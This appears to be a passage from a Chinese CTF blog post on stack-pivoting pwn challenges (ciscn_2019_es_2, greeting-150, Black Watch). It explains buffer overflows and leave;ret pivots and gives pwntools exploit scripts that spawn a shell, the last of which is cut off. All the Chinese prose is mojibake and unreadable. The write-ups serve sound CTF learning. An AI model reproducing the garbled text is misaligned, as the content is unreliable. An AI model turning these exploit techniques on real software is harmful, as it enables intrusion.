ˆè¿ç§»çš„å®æˆ˜è¿ç”¨</h1><p>æ¥ä¸‹æ¥æ˜¯æœ‰å››é“æ ˆè¿ç§»çš„é¢˜ç›®æ¥ç»ƒä¹ ã€‚åˆ†åˆ«æ˜¯</p><p>æ”»é˜²ä¸–ç•Œä¸Šçš„greeting-150</p><p>BUUCTFä¸Šçš„[Black Watch å…¥ç¾¤é¢˜]</p><p>BUUCTFä¸Šçš„ciscn_2019_es_2</p><p>BUUCTFä¸Šçš„gyctf_2020_borrowstack</p><p>å®ƒä»¬è€ƒå¯Ÿäº†åœ¨è¿ç§»åˆ°æ ˆï¼Œè¿ç§»åˆ°bssæ®µï¼Œä»mainå‡½æ•°ç»“æŸæ—¶è¿ç§»ï¼Œä»mainå‡½æ•°è°ƒç”¨çš„å‡½æ•°ç»“æŸæ—¶è¿ç§»ï¼Œå’Œ64ä½çš„æ ˆè¿ç§»ä»¥åŠret2csuã€‚åœ¨è¿™é‡Œï¼Œæˆ‘åˆ†åˆ«ä¹Ÿç»™å‡ºä»–ä»¬çš„wpã€‚</p><hr><h2 id="BUUCTFä¸Šçš„ciscn-2019-es-2"><a href="#BUUCTFä¸Šçš„ciscn-2019-es-2" class="headerlink" title="BUUCTFä¸Šçš„ciscn_2019_es_2"></a>BUUCTFä¸Šçš„ciscn_2019_es_2</h2><p><img src="/../img/2706180-20220118103554143-806908519.jpg"><img src="/../img/2706180-20220118103707874-2116954617.jpg"></p><p>è¿™é‡Œæˆ‘ä»¬å‘ç°äº†æº¢å‡ºç‚¹ã€‚Readè¯»å…¥åˆ°sçš„è¿™ä¸ªåœ°æ–¹ï¼Œè·ç¦»ebpåªæœ‰0x28ä¸ªå­—èŠ‚ï¼Œå¯æ˜¯ä¸¤ä¸ªreadéƒ½å¯ä»¥å†™å…¥0x30ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥æº¢å‡ºè¦†ç›–ebpå’Œè¿”å›åœ°å€ã€‚</p><p><img src="/../img/2706180-20220118103715766-1605737103.png"></p><p>æˆ‘ä»¬è¿˜å‘ç°äº†åé—¨å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰å‚æ•°ã€‚</p><p><img src="/../img/2706180-20220118120250348-503674972.jpg"></p><p>é‚£ç°åœ¨å¤§æ¦‚æ€è·¯å°±æ˜¯ï¼Œæˆ‘ä»¬è¦ç”¨ç¬¬ä¸€ä¸ªreadæ¥æ³„éœ²ä¸‹ebpçš„åœ°å€***ï¼ˆå› ä¸ºæ˜¯printfæ¥æ‰“å°å­—ç¬¦ä¸²ï¼Œå‚æ•°æ˜¯%sï¼Œå› æ­¤æ˜¯é‡è§00æ‰åœæ­¢æ‰“å°ï¼Œåªè¦æˆ‘ä»¬ç¬¬ä¸€æ¬¡readæ­£å¥½è¾“å…¥0x30ä¸ªå­—ç¬¦ï¼Œé‚£å°±æ²¡æœ‰åœ°æ–¹åœ¨å¡«ä¸Š00äº†ï¼ˆreadè¯»å…¥ä¹‹åï¼Œä¼šè‡ªåŠ¨è¡¥å……00ï¼‰ï¼Œå› æ­¤å°±å¯ä»¥æŠŠä¸‹é¢çš„ebpåœ°å€ç»™æ‰“å°å‡ºæ¥äº†***ï¼‰ï¼Œç„¶åç¬¬äºŒä¸ªreadç”¨æ¥å¡«å……æˆ‘ä»¬æ„é€ çš„systemå‡½æ•°ä»¥åŠå‚æ•°ï¼ˆæˆ‘ä»¬è¿™æ¬¡æ˜¯è½¬ç§»åˆ°äº†æ ˆä¸­ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¬¡readè¯»å…¥sçš„åœ°æ–¹ï¼‰ï¼Œå‚æ•°åˆ†å¸ƒå‚è€ƒä¸Šå›¾</p><p>ä¸ºä»€ä¹ˆè¦æ‹¿åˆ°ebpåœ°å€å‘¢ï¼Œçœ‹ä¸Šå›¾çš„&#x2F;bin&#x2F;shåœ°å€ï¼Œæˆ‘ä»¬æ€ä¹ˆçŸ¥é“å®ƒçš„åœ°å€æ˜¯ä»€ä¹ˆå‘¢ï¼Œæˆ‘ä»¬ä¸çŸ¥é“ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“å®ƒè·ç¦»ebpçš„åç§»ï¼ˆé€šè¿‡IDAçš„æ ˆå›¾å¯ä»¥æ•°å‡ºæ¥ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è·å¾—ebpçš„å€¼ï¼Œé…åˆåç§»æ¥è¡¨è¾¾å‡ºè¿™ä¸ªåœ°å€ï¼Œ***è¿™é‡Œè¦å°¤å…¶æ³¨æ„è¿™ä¸ªebpæ˜¯mainå‡½æ•°çš„ï¼Œå› ä¸ºprintfæ˜¯æ‰“å°å†…å­˜å•å…ƒé‡Œçš„å†…å®¹ï¼Œebpç¡®å®æ˜¯æŒ‡å‘äº†vulçš„æ ˆåº•ï¼Œä½†æ˜¯ebpé‡Œé¢è£…çš„å†…å®¹å¯æ˜¯mainå‡½æ•°çš„æ ˆåº•ï¼Œå› æ­¤è¿™ä¸ªebpæ˜¯mainå‡½æ•°çš„æ ˆåº•***ã€‚è‡³äºè¿™ä¸ª0x28æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿ</p><p>è¿™é‡Œè¦ç”¨gdbè°ƒè¯•ä¸€ä¸‹ï¼Œæ–­ç‚¹ä¸‹åˆ°å“ªæ— æ‰€è°“ï¼Œä¸»è¦å°±æ˜¯è¦çœ‹vulå‡½æ•°å¿«ç»“æŸçš„æ—¶å€™ï¼Œçœ‹ä¸‹æ ˆå›¾ã€‚</p><p><img src="/../img/2706180-20220118120659280-353618504.jpg"></p><p>å½“ç„¶ï¼Œä½ å®é™…åšé¢˜çš„æ—¶å€™ï¼Œè‚¯å®šæ˜¯çœ‹ä¸è§&#x2F;bin&#x2F;shè£…åˆ°å“ªäº†ï¼Œä¸è¿‡æ²¡äº‹ï¼Œåœ¨IDAé‡Œé¢æˆ‘ä»¬åˆ†æä¸€ä¸‹ï¼Œç„¶åçœ‹ä¸€ä¸‹å®ƒè£…åœ¨å“ªäº†ï¼Œè¿˜æ˜¯è¿™ä¸ªå›¾ï¼Œå‘ç°&#x2F;bin&#x2F;shè£…åœ¨äº†è·ç¦»æ ˆé¡¶æ˜¯æœ‰å››ä¸ªå†…å­˜å•å…ƒçš„è·ç¦»ï¼Œç„¶åå†åˆ°gdbä¸Šå»æ•°ä¸€ä¸‹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„å­—ç¬¦ä¸²ä¼šå­˜åˆ°0xffd9d730è¿™ä¸ªä½ç½®ï¼Œç„¶åç”¨0xffded758å‡å»è¿™ä¸ª0xffd9d730ï¼Œå°±èƒ½å¾—åˆ°è¿™ä¸ªåç§»0x28äº†ã€‚</p><p><img src="/../img/2706180-20220118120250348-503674972.jpg"></p><p>æœ€åçš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25986)</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span>+<span class="number">0x8</span>*<span class="string">&#x27;b&#x27;</span></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">level_ret_addr=<span class="number">0x08048562</span></span><br><span class="line"></span><br><span class="line">sys_addr=e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)<span class="comment">#ç¬¬ä¸€æ¬¡ä»…ä»…å°±æ˜¯ä¸ºäº†æ³„éœ²mainå‡½æ•°çš„ebp</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload2=(<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0xffd9d730</span>)+<span class="string">&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(ebp-<span class="number">0x38</span>)+p32(level_ret_addr)<span class="comment">#è¿™ä¸ªljustçš„æ„æ€æ˜¯è¯´ä¸è¶³0x28çš„éƒ¨åˆ†è¡¥æˆ00ï¼ˆä¹Ÿå°±æ˜¯æˆ‘åœ¨ä¸Šå›¾ä¸­æ ‡æ³¨çš„åƒåœ¾æ•°æ®ï¼‰è¿™ä¸ª0x38çš„åç§»ç®—æ³•å’Œä¸Šé¢é‚£ä¸ª0x28æ˜¯ç›¸åŒçš„ï¼Œè¿™ä¸ªåœ°å€æ˜¯æ ˆé¡¶çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬payloadä¸­aaaaçš„åœ°å€ï¼Œè¦ç”¨è¿™ä¸ªåœ°å€å»è¦†ç›–ebp</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="æ”»é˜²ä¸–ç•Œä¸Šçš„greeting-150"><a href="#æ”»é˜²ä¸–ç•Œä¸Šçš„greeting-150" class="headerlink" title="æ”»é˜²ä¸–ç•Œä¸Šçš„greeting-150"></a>æ”»é˜²ä¸–ç•Œä¸Šçš„greeting-150</h2><p><img src="/../img/2706180-20220118121000718-655614088.jpg"></p><p>è¿™é‡Œè¡¨é¢ä¸Šæ˜¯çœ‹å¼€äº†canaryï¼Œä½†æ˜¯åœ¨ä¸»è¦çš„å‡½æ•°ä¸­ï¼Œæ²¡æœ‰å‘ç°canaryçš„å½±å­ï¼Œå› æ­¤ï¼Œè¿™ä¸ªcanaryä¿æŠ¤ï¼Œåœ¨è¿™é‡Œæ˜¯æœ‰ç‚¹è¿·æƒ‘æ€§çš„ï¼Œæˆ‘ä»¬å¯ä»¥å»æº¢å‡ºã€‚</p><p><img src="/../img/image-20221007101237565.png" alt="image-20221007101237565"></p><p> åœ¨ä¸Šå›¾ä¸­æ ‡æ³¨äº†ï¼Œbase64decodeï¼Œæ˜¯å°†è§£ç åçš„å†…å®¹æ”¾åœ¨äº†v4é‡Œé¢ï¼Œè€Œä¸æ˜¯v6é‡Œé¢ï¼Œv6é‡Œæ”¾çš„æ˜¯è§£ç åçš„å­—ç¬¦ä¸²é•¿åº¦ã€‚</p><p> æˆ‘ä¹‹å‰çœ‹å¸ˆå‚…ä»¬çš„wpä¸€ç›´çº³é—·ï¼Œè¿™è¾“å…¥çš„å†…å®¹ä¹Ÿæ²¡æœ‰è¢«ç¼–ç è¿‡ï¼Œå’‹å°±åˆ°è¿™é‡Œå¯ç›´æ¥å°±è§£ç äº†ï¼Œæœ€åçœ‹åˆ°äº†expæ‰æ˜ç™½ï¼ŒåŸæ¥æ˜¯æˆ‘ä»¬å‘é€payloadæ—¶å€™ï¼Œæˆ‘ä»¬è‡ªå·±å»ç¼–ç â€¦ï¼Œé…åˆè¿™ä¸ªä¿¡æ¯ï¼Œæˆ‘ä¹Ÿå°±æ˜ç™½äº†ï¼ŒåŸæ¥v6&gt;0xcçš„è¿™ä¸ªé™åˆ¶ï¼Œæ˜¯è¯´æˆ‘ä»¬payloadåªèƒ½å‘é€12ä¸ªå­—èŠ‚ã€‚</p><p>æ‰§è¡Œäº†è¿™å¥ä¹‹åï¼Œæˆ‘ä»¬çš„inputé‡Œé¢æ”¾çš„ä¹Ÿæ˜¯è§£ç ä¹‹åçš„å†…å®¹äº†ï¼ˆå› ä¸ºæˆ‘ä»¬æ˜¯è¦æŠŠpayloadç¼–ç ä¹‹åå‘é€ï¼Œå› æ­¤è¿™é‡Œçš„inputå®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬çš„payload)<br><font color=red><br>ç°åœ¨inputé‡Œé¢å°±æ˜¯payloadï¼Œè¿™ä¸ªpayloadåªèƒ½å‘é€12ä¸ªå­—èŠ‚</p></font><p>okï¼Œæˆ‘ä»¬ç»§ç»­å»çœ‹authè¿™ä¸ªå‡½æ•°ã€‚</p><p><img src="/../img/image-20221007101316583.png" alt="image-20221007101316583"></p><p>  æ‰¾åˆ°äº†æº¢å‡ºç‚¹ï¼Œåœ¨è¿™é‡Œã€‚[ebp-8h]çš„æ„æ€æ˜¯è¯´ï¼Œè¿™ä¸ªv4è·ç¦»ebpæœ‰å…«ä¸ªå­—èŠ‚çš„è·ç¦»ï¼Œå¯æ˜¯inputé‡Œé¢å¯ä»¥è£…12ä¸ªå­—èŠ‚ï¼Œç°åœ¨memcpyå°±å¯ä»¥æŠŠinputçš„å†…å®¹å¤åˆ¶ç»™äº†v4ï¼ˆè¿™ä¸ªv4å’Œmainå‡½æ•°é‡Œçš„v4ä¸æ˜¯ä¸€ç äº‹ï¼‰ åªèƒ½è£…8ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯å¤åˆ¶äº†12ä¸ªå­—èŠ‚è¿‡å»ï¼Œæœ‰ä»€ä¹ˆå¥½è¯´çš„ï¼Œæº¢å‡ºå°±å®Œäº‹äº†ã€‚ä½†æ˜¯åªèƒ½æº¢å‡ºè¦†ç›–ebpï¼Œ<font color=red><strong>ä¹‹å‰æ ˆè¿ç§»çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸ºäº†å‡‘é½ä¸¤æ¬¡leave;retéƒ½æ˜¯å°†mainå‡½æ•°çš„è¿”å›åœ°å€å†™æˆleave,retçš„åœ°å€ï¼Œä½†æ˜¯è¿™é“é¢˜æˆ‘ä»¬æ²¡æ³•å†™åˆ°è¿”å›åœ°å€ä¸Šï¼Œæ€ä¹ˆåŠï¼Œæˆ‘ä»¬æ²¡åŠæ³•å‡‘å¤Ÿä¸¤æ¬¡leave;retäº†ä¹ˆï¼Œä¸ä¸ä¸ï¼Œåˆ«å¿˜äº†æˆ‘ä»¬ç°åœ¨å¯ä¸åœ¨mainå‡½æ•°è¿˜æ˜¯åœ¨authå‡½æ•°é‡Œé¢ï¼Œå½“authå‡½æ•°ç»“æŸçš„æ—¶å€™ä¹Ÿä¼šæ‰§è¡Œä¸€æ¬¡leave;retå†åŠ ä¸Šmainå‡½æ•°ç»“æŸçš„ä¸€æ¬¡leave;retï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿå‡‘å¤Ÿäº†ä¸¤æ¬¡leave;retã€‚</strong></font></p><p>æˆ‘ä»¬éœ€è¦æ¢åˆ°å“ªä¸ªåœ°æ–¹å»æ‰§è¡Œåé—¨å‡½æ•°å‘¢ï¼Ÿæ²¡é”™ï¼Œå°±æ˜¯åˆšæ‰è¯´çš„input</p><p><img src="/../img/image-20221007101341015.png" alt="image-20221007101341015"></p><p>è¿™é‡Œä¹Ÿå¯ä»¥çœ‹åˆ°inputæ˜¯å¤„äºbssæ®µçš„ã€‚</p><p> ç°åœ¨æˆ‘ä»¬æ¥çœ‹è¿™é“é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å¾€inputé‡Œé¢è¾“å…¥12ä¸ªå­—èŠ‚ï¼Œé‚£å‡è®¾æˆ‘è¾“å…¥çš„æ˜¯aaaabbbbccccï¼Œ<font color=red>ï¼ˆå¹¶ä¸”è¿™ä¸ªccccæ˜¯aaaabbbbccccè¿™ä¸ªå­—ç¬¦ä¸²çš„é¦–åœ°å€ï¼‰ã€‚</font></p><p>é‚£ä¹ˆç°åœ¨æ ˆé‡Œå°±æ˜¯è¿™ä¹ˆä¸ªæƒ…å†µ<br><img src="../img/image-20221007101352060.png" alt="image-20221007101352060" style="zoom:50%;" /></p><p>å½“æ‰§è¡Œåˆ°leaveçš„æ—¶å€™ï¼Œmov esp ebpï¼Œæ­¤æ—¶çš„espæ˜¯ccccäº†ï¼Œç„¶åebpåŸæœ¬è¯¥å›åˆ°æ­£å¸¸çš„mainå‡½æ•°çš„æ ˆåº•ï¼Œå¯æ˜¯ç°åœ¨å®ƒæ¥åˆ°äº†ccccçš„è¿™ä¸ªåœ°å€ï¼ˆå› ä¸ºæ‰§è¡Œäº†authå‡½æ•°ä¸­çš„leave retï¼Œè¿™é‡Œæ‰æ˜¯æ ¸å¿ƒç‚¹ï¼‰ï¼ˆå¹¶ä¸”è¦æ³¨æ„çš„æ˜¯ebpå†…å®¹å’Œebpæ˜¯ä¸¤ä¸ªä¸œè¥¿ï¼Œebpçš„å†…å®¹è£…ä»€ä¹ˆéƒ½å¯ä»¥ï¼Œä½†æ˜¯ebpæœ¬èº«åªèƒ½å»æŒ‡å‘åœ°å€ï¼‰ï¼ˆå³æ­¤æ—¶æ˜¯ebpæŒ‡å‘äº†aaaaçš„åœ°å€ï¼Œä¸Šé¢è¯´äº†ccccçš„åœ°å€æ˜¯æŒ‡å‘çš„aaaaæ‰€å¤„ä½ç½®ï¼‰ã€‚</p><p>ç°åœ¨ç¨‹åºç»§ç»­è¿è¡Œï¼Œå› ä¸ºå‡½æ•°çš„è¿”å›åœ°å€æ˜¯æ­£å¸¸çš„ï¼Œæ‰€ä»¥å®ƒè¿˜æ˜¯å›åˆ°äº†mainå‡½æ•°é‡Œï¼Œå®ƒåˆå¼€å§‹å¾€ä¸‹è¿è¡Œï¼Œç›´åˆ°mainå‡½æ•°ç»“æŸäº†ï¼Œå®ƒå¼€å§‹æ‰§è¡Œleaveï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬åˆä¸€æ¬¡mov esp ebpï¼›espæˆäº†aaaaçš„åœ°å€ï¼Œè¿™ä¸ªæ—¶å€™åˆè¿›è¡Œäº†pop ebpï¼Œé‚£ä¹ˆespæˆäº†bbbbï¼Œæœ€ååˆ°retçš„æ—¶å€™ï¼Œpop eipï¼Œæ­¤æ—¶å°±ä¼šæŠŠæ ˆé¡¶çš„bbbbï¼Œå¼¹å…¥eipå»æ‰§è¡Œäº†ã€‚</p><p>å¦‚æœæ„Ÿè§‰æˆ‘è¯´çš„å¤ªæŠ½è±¡äº†ï¼Œæ²¡æœ‰å›¾ç‰‡çš„è¯ï¼Œå¯ä»¥å‚è€ƒè¿™ä¸ªå¸ˆå‚…çš„æ–‡ç« <a href="https://blog.csdn.net/weixin_43868725/article/details/108366539?ops_request_misc=%7B%22request_id%22:%22164229926316780265467309%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=164229926316780265467309&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108366539.first_rank_v2_pc_rank_v29&utm_term=format2&spm=1018.2226.3001.4187">(24æ¡æ¶ˆæ¯) format2(xctf)_whiteh4ndçš„åšå®¢-CSDNåšå®¢</a>ï¼Œä»–è¿™é‡Œé¢æœ€åç”»çš„ä¸‰å¼ å›¾ç‰‡ï¼Œæè¿°çš„å¾ˆæ¸…æ¥šï¼Œæˆ‘ä¸Šé¢çš„å™è¿°è¿‡ç¨‹ï¼Œè·Ÿä»–å›¾ç‰‡è¡¨è¾¾çš„æ˜¯ä¸€ä¸ªæ„æ€ã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬æ‹è¿‡æ¥çœ‹ä¸€ä¸‹ï¼Œeipæ‰§è¡Œäº†bbbbï¼Œé‚£æˆ‘ä»¬æŠŠbbbbæ¢æˆåé—¨å‡½æ•°çš„åœ°å€ä¸å°±okäº†ï¼Œç„¶åæ˜¯ccccçš„è¿™ä¸ªåœ°å€ï¼Œä¸å°±æ˜¯æˆ‘ä»¬è¿™é“é¢˜çš„inputåœ°å€ä¹ˆï¼Œinputæœ¬èº«èƒ½è£…12ä¸ªå­—èŠ‚ï¼ŒæŠŠå®ƒæœ¬èº«çš„åœ°å€å†™åˆ°ccccï¼Œå°±æ˜¯12ä¸ªå­—èŠ‚çš„æœ€å4å­—èŠ‚ï¼Œè¿™æ ·ä¸å°±æŠŠæ ˆè¿ç§»åˆ°inputçš„å†…å®¹é‡Œäº†ä¹ˆï¼ˆä½†äº‹å®ä¸Šæ ˆæ²¡æœ‰è¿‡å»ï¼Œæ¯•ç«Ÿè¿™é‡Œå¯æ˜¯bssæ®µï¼‰</p><p>Expç¼–å†™å¾ˆç®€å•</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">59650</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x08049284</span></span><br><span class="line"></span><br><span class="line">input_addr=<span class="number">0x0811EB40</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(input_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è‡³æ­¤æœ¬é¢˜ä¹Ÿå°±ç»“æŸäº†ã€‚</p><p>ä½†é€šè¿‡è¿™é“é¢˜ï¼Œæˆ‘å­¦åˆ°äº†ä¸å°‘çš„ä¸œè¥¿ã€‚</p><p>å°¤å…¶æ˜¯è¿™ä¸ªå‡½æ•°</p><img src="../img/2706180-20220118123108947-994146250.jpg" alt="EJnn.jpg" border="0"><p>è¿™é‡Œæˆ‘ä¸€ç›´æ˜¯åœ¨æƒ³æ€ä¹ˆæŠŠinputå†™æˆè¿™ä¸ª-559038737ï¼Œè€Œå¿˜è®°äº†å…¶å®ä¸å¿…å¾ªè§„è¹ˆçŸ©ï¼Œå› ä¸ºæ²¡å¼€pieï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥æŠŠè¿™ä¸ªsystemå‡½æ•°çš„åœ°å€å»å¼„åˆ°eipé‡Œé¢ä½¿å…¶æ‰§è¡Œã€‚ä¹Ÿè®¤è¯†åˆ°äº†æ‰¾æ¼æ´ç‚¹çš„é‡è¦æ€§ï¼Œä¸Šæ¥å°±å»ä»”ç»†åˆ†æå‡½æ•°çš„åŠŸèƒ½ç”¨å¤„ä¸å¤§ï¼Œå¤§è‡´æ‰«è¿‡å³å¯ï¼Œå…ˆå»æ‰¾æ˜æ˜¾çš„æ¼æ´ç‚¹ï¼Œåœ¨å›´ç»•è¿™ä¸ªæ¼æ´ç‚¹æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬èƒ½åˆ©ç”¨å®ƒåšäº›ä»€ä¹ˆã€‚</p><hr><hr><h2 id="BUUCTFä¸Šçš„-Black-Watch-å…¥ç¾¤é¢˜"><a href="#BUUCTFä¸Šçš„-Black-Watch-å…¥ç¾¤é¢˜" class="headerlink" title="BUUCTFä¸Šçš„[Black Watch å…¥ç¾¤é¢˜]"></a>BUUCTFä¸Šçš„[Black Watch å…¥ç¾¤é¢˜]</h2><img src="../img/2706180-20220118123108942-1379753087.jpg" alt="E2mG.jpg" border="0"><pre><code>æ‰“å¼€IDAå‘ç°ï¼Œä¸»ç¨‹åºä¸­ï¼Œbufè·ç¦»æ ˆåº•æœ‰0x18ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æœ€åçš„ä¸€ä¸ªreadå´å¯ä»¥è¯»å…¥0x20ä¸ªå­—èŠ‚ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œå­˜åœ¨æº¢å‡ºï¼Œä½†æ˜¯å§ï¼Œè¿™ä¸ªæº¢å‡ºçš„é•¿åº¦ä¹Ÿæ˜¯å¾ˆå°´å°¬çš„ï¼Œæˆ‘ä»¬ç¡®å®å¯ä»¥å¡«å…¥systemå‡½æ•°åœ°å€ï¼Œä½†æ˜¯è¿™æ ·å°±æ²¡åŠæ³•ä¼ å‚æ•°äº†ï¼Œè€Œä¸”æˆ‘ä»¬å‘ç°ç¨‹åºé‡Œä¹Ÿæ²¡æœ‰systemå‡½æ•°ï¼Œå› æ­¤è‚¯å®šè¿˜æ˜¯è¦æ³„éœ²å‡½æ•°åœ°å€ï¼Œç”¨libcé‡Œé¢çš„systemè·å–shellã€‚æˆ‘ä»¬å‘ç°è¿™é‡Œçš„æº¢å‡ºåˆšå¥½å¯ä»¥è¦†ç›–ebpå’Œè¿”å›åœ°å€ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œè¦ç”¨æ ˆè¿ç§»ã€‚ç„¶åæˆ‘ä»¬å†çœ‹ä¸‹ç¬¬ä¸€ä¸ªreadæŠŠè¾“å…¥çš„å†…å®¹å‚¨å­˜åˆ°å“ªäº†</code></pre> <img src="../img/2706180-20220118123108938-1447621027.jpg" alt="EfG9.jpg" border="0"><p>å‘ç°æ˜¯å­˜åˆ°äº†bssæ®µã€‚</p><p>é‚£æˆ‘ä»¬çš„æ€è·¯å¤§æ¦‚å°±å‡ºæ¥çš„ï¼Œé¦–å…ˆæŠŠåœ¨ç¬¬ä¸€æ¬¡è¾“å…¥ä¸­readå»æŠŠwrite_pltçš„åœ°å€å’Œå®ƒçš„å‚æ•°å­˜è¿›å»ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦systemå‡½æ•°åœ°å€è‚¯å®šæ˜¯éœ€è¦å…ˆæ³„éœ²libcåŸºåœ°å€çš„ã€‚ç„¶åç¬¬äºŒæ¬¡è¾“å…¥å»æŠŠebpç»™æ”¹æˆbssæ®µçš„åœ°å€ï¼Œç„¶åæŠŠè¿”å›åœ°å€æ”¹æˆleave,retåœ°å€ï¼ˆå…·ä½“åŸå› å‚è€ƒæ ˆè¿ç§»åŸç†ï¼‰</p><p>ç„¶åç¨‹åºä»mainå‡½æ•°è¿”å›çš„æ—¶å€™ï¼Œè¢«åŠ«æŒåˆ°äº†bssæ®µï¼Œå»æ‰§è¡Œäº†writeå‡½æ•°ï¼Œæ³„éœ²å‡ºæ¥writeå‡½æ•°çš„gotåœ°å€ï¼Œ<strong>å¹¶ä¸”æŠŠå®ƒçš„è¿”å›åœ°å€å¡«å†™æˆmainå‡½æ•°</strong>ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦å†è®©ç¨‹åºè·‘ä¸€æ¬¡ï¼Œæ¯•ç«Ÿæˆ‘ä»¬æœ€ç»ˆå¯æ˜¯è¦å»æ‰§è¡Œsystemå‡½æ•°çš„ï¼Œç°åœ¨åªæ˜¯æŠŠlibcåŸºåœ°å€ç»™æ³„éœ²å‡ºæ¥äº†è€Œå·²ã€‚</p><p>ç°åœ¨æ‰§è¡Œå®Œäº†writeå‡½æ•°ï¼Œç„¶åè¿”å›åˆ°mainå‡½æ•°é‡æ–°è·å¾—äº†ä¸¤æ¬¡è¾“å…¥çš„æœºä¼šï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾ç„¶å¦‚æ³•ç‚®åˆ¶ï¼Œåœ¨ç¬¬ä¸€æ¬¡è¾“å…¥ä¸­å­˜å…¥systemå‡½æ•°åœ°å€å’Œå®ƒçš„å‚æ•°ï¼Œæ­¤æ—¶å„å•ä½ä»¥å°±ä½ï¼Œå°±å·®äº†ä¿®æ”¹ebpäº†ï¼Œç„¶åæ¥åˆ°äº†ç¬¬äºŒæ¬¡è¾“å…¥ï¼Œæˆ‘ä»¬å…ˆå¡«å……åƒåœ¾æ•°æ®ï¼Œç›´åˆ°å¡«å……è‡³ebpï¼Œç„¶åæŠŠebpçš„åœ°å€å†™æˆbssæ®µçš„åœ°å€ï¼Œè¿˜è¦æŠŠè¿”å›åœ°å€å†™æˆleave;retçš„åœ°å€ã€‚</p><p>æœ€åmainå‡½æ•°è¿”å›çš„æ—¶å€™å°±è¿›è¡Œäº†æ ˆè¿ç§»ï¼Œæ¥åˆ°äº†æˆ‘ä»¬æ­¥éª¤çš„bssæ®µï¼Œç„¶åæ‰§è¡Œsystemå‡½æ•°ï¼ŒæˆåŠŸGetShellã€‚</p><p>ä»¥ä¸Šåªæ˜¯ä»‹ç»äº†æœ¬é¢˜çš„æ€è·¯ï¼Œä½†æ˜¯æ²¡æœ‰æ¢ç©¶åŸç†ï¼Œå…·ä½“åŸç†å‚è€ƒå‰é¢çš„æ ˆè¿ç§»åŸç†éƒ¨åˆ†ã€‚</p><p>æœ¬é¢˜çš„exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27917</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span 